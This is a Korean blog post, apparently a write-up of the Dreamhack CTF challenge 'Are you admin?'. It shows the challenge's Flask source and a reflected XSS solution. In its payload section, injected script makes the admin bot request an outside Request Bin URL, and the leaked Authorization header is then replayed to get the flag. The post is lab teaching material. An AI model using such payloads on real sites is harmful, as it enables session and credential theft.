---
layout: post
comments: true
sitemap:

title: "[CTF] Dreamhack 문제 풀이: Are you admin?"
excerpt: "Reflected XSS"

date: 2026-09-14
last_modified_at: 2026-09-14

categories: [CTF]
tags: [TIL, WEB, CTF]
---

<!-- markdownlint-disable MD010 MD025 MD029 MD033 -->

# [Dreamhack] Are you admin?

## 목차

1. [Intro](#1-intro)
2. [Code](#2-code)
    1. [`/whoami`](#21-whoami)
    1. [`/`](#22-)
    1. [`/intro`](#23-intro)
    1. [`/report`](#24-report)
    1. [`access_page(name, detail)`](#25-access_pagename-detail)
3. [Vuln](#3-vuln)
4. [Payload](#4-payload)

## 1. Intro

Dreamhack 링크: <https://dreamhack.io/wargame/challenges/1922>

## 2. Code

### 2.1. `/whoami`

<details>
<summary>코드 접기/펼치기</summary>
<div markdown="1">

```python
@app.route("/whoami", methods=["GET"])
def whoami():
    # Authorization 헤더
    user_info = ""
    authorization = request.headers.get('Authorization')

    if authorization:
        user_info = b64decode(authorization.split('Basic ')[1].encode()).decode()
    else:
        user_info = "guest:guest"

    id = user_info.split(":")[0]
    password = user_info.split(":")[1]

    if ((id == 'admin') and (password == '[**REDACTED**]')):
        message = FLAG
        return render_template('whoami.html',id=id, message=message)
    else:
        message = "You are guest"
        return render_template('whoami.html',id=id, message=message)
```

</div>
</details>

1. `Authorization`이라는 헤더에서 `id`와 `password`로 인증한다.
2. `admin`일 경우 flag를 출력한다.

### 2.2. `/`

<details>
<summary>코드 접기/펼치기</summary>
<div markdown="1">

```python
@app.route("/", methods=["GET"])
def index():
    return redirect("/intro")
```

</div>
</details>

- `/intro` 페이지로 리다이렉트한다.

### 2.3. `/intro`

<details>
<summary>코드 접기/펼치기</summary>
<div markdown="1">

```python
@app.route("/intro", methods=["GET"])
def intro():
    name = request.args.get("name")
    detail = request.args.get("detail")
    return render_template("intro.html", name=name, detail=detail)
```

</div>
</details>

- `name`과 `detail`을 파라미터로 받아서 렌더링한다.

### 2.4. `/report`

<details>
<summary>코드 접기/펼치기</summary>
<div markdown="1">

```python
@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        path = request.form.get("path")
        if not path:
            return render_template("report.html", msg="fail")

        else:
            parsed_path = urlparse(path)
            params = parse_qs(parsed_path.query)
            name = params.get("name", [None])[0]
            detail = params.get("detail", [None])[0]

            if access_page(name, detail):
                return render_template("report.html", message="Success")
            else:
                return render_template("report.html", message="fail")
    else:
        return render_template("report.html")
```

</div>
</details>

1. `path` 파라미터를 받아서 `name`과 `detail`을 구분한다.
2. `access_page(name, detail)`을 호출한다.

### 2.5. `access_page(name, detail)`

<details>
<summary>코드 접기/펼치기</summary>
<div markdown="1">

```python
def access_page(name, detail):
    try:
	    # admin의 id와 password 삽입
        user_info = f'admin:{PASSWORD}'
        # base64로 인코딩
        encoded_user_info = b64encode(user_info.encode()).decode()
        # 크롬 드라이버 호출
        service = Service(executable_path="/chromedriver-linux64/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        # Authorization 헤더 추가
        driver.execute_cdp_cmd(
            'Network.setExtraHTTPHeaders',
            {'headers': {'Authorization': f'Basic {encoded_user_info}'}}
        )
        # 네트워크 도메인 활성화
        driver.execute_cdp_cmd('Network.enable', {})
        # 인덱스 페이지 접근
        driver.get(f"http://127.0.0.1:8000/")
        # intro 페이지 접근
        driver.get(f"http://127.0.0.1:8000/intro?name={quote(name)}&detail={quote(detail)}")
        sleep(1)
    except Exception as e:
        print(e, flush=True)
        driver.quit()
        return False
    driver.quit()
    return True
```

</div>
</details>

1. `Authorization` 헤더에 admin 계정이 추가된다.
2. `/`에 접근한다.
3. `/intro?name={}&detail={}`에 접근한다.

## 3. Vuln

Reflected XSS

## 4. Payload

1. `/intro` 페이지에 접속한다.
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-30-04.png)
2. `/intro` 기능의 기능을 확인한다.
	- `/intro?name=1&detail=2`
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-30-50.png)
	- 화면에 입력값이 바로 출력되는 것이 보인다.
3. Reflected XSS가 되는 지 확인한다.
	- `/intro?name=<script>alert(1)</script>&detail=<script>alert(2)</script>`
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-32-01.png)
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-32-27.png)
	→ Reflected XSS가 되는 것을 확인했다.
4. `/report`의 기능을 확인한다.
	- `/intro?name=1&detail=2`
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-33-13.png)
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-33-50.png)
	- 정상적으로 성공하면 `Success` 문구가 출력되는 것을 확인했다.
5. XSS 스크립트를 삽입한다.
	- `/intro?name=<script>let img=new Image();img.src="<드림핵 Request Bin URL>";document.body.appendChild(img);</script>&detail=1`
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-34-29.png)
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-34-53.png)
	- 실행에 성공한 것을 확인했다.
6. Request Bin을 확인한다.
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-36-26.png)
	- `/whoami` 페이지 인증에 필요한 `Authorization` 헤더값 확인
7. `/whoami`에 접속
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-36-58.png)
	- 기본적으로 접속하면 `guest`임을 확인
8. `/whoami` 접속할 때 `Authorization` 헤더 삽입한다.
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-37-58.png)
	- Burp Suite를 이용해 Request 요청에 Authorization을 삽입했다.
9. flag 확인
	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-39-10.png)
	- flag 값을 확인할 수 있다.
